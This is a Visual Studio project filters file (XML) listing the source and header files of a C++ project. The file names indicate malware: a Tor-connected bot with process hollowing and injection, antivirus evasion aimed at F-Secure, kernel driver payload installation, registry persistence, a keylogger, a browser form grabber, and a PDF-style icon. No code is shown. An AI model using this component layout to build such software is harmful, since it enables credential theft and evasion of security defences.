<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Text Include="ReadMe.txt" />
    <Text Include="docs.txt">
      <Filter>Source Files</Filter>
    </Text>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="persistance.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="global_config.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="crypto.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="anti_debugging.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="binder_payload.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="junk_asm.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="process_droppelganging.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="process_injections.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="process_hollow.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="anti_av_fsecure.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="anti_av_fsecure_customhooks.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="anti_av_fsecure_definitions.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="anti_av_fsecure_hook.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="anti_av_fsecure_memory.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common_utils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="kernel_driver_functions.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="kernel_driver_install_payload.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="persistance_registry.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="functions_table_utils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="functions_table.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="functions_table_constants.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="kernel_driver_installer_invoker.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="debug.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="connection.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="binder_executor.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="tor_executor.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="connection_tor.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="bot.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="bot_tasks.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="process_utils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="privilege_utils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="main.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="process_injection_chrome.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="process_injection_keylogger.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="function_table_core.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="manager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="manager_init.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="manager_tor.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="manager_bot_auto_update_lastseen_thread.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="manager_bot_auto_get_task_thread.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="manager_keylogger_inject_thread.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="manager_form_grabber_inject_thread.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="persistance.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="crypto.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="anti_debugging.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="binder_payload.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="process_droppelganging.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="process_injections.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="process_hollow.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="anti_av_fsecure.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="anti_av_fsecure_customhooks.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="anti_av_fsecure_definitions.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="anti_av_fsecure_hook.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="anti_av_fsecure_memory.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common_utils.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="kernel_driver_functions.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="kernel_driver_install_payload.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="persistance_registry.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="functions_table_utils.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="functions_table.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="kernel_driver_installer_invoker.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="debug.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="binder_executor.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="tor_executor.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="connection_tor.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="bot.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="connection.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="bot_tasks.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="process_utils.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="privileges_utils.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="process_injection_chrome.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="process_injection_keylogger.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="function_table_core.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="manager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="manager_init.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="manager_tor.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="manager_bot_auto_update_lastseen_thread.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="manager_bot_auto_get_task_thread.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="manager_keylogger_inject_thread.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="manager_form_grabber_inject_thread.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="localhost_safer.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <Image Include="icon1.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="..\..\..\..\..\Desktop\icon\pdf_1.ico">
      <Filter>Resource Files</Filter>
    </Image>
  </ItemGroup>
  <ItemGroup>
    <None Include="..\..\..\..\..\..\..\tor\data.xpeg" />
  </ItemGroup>
</Project>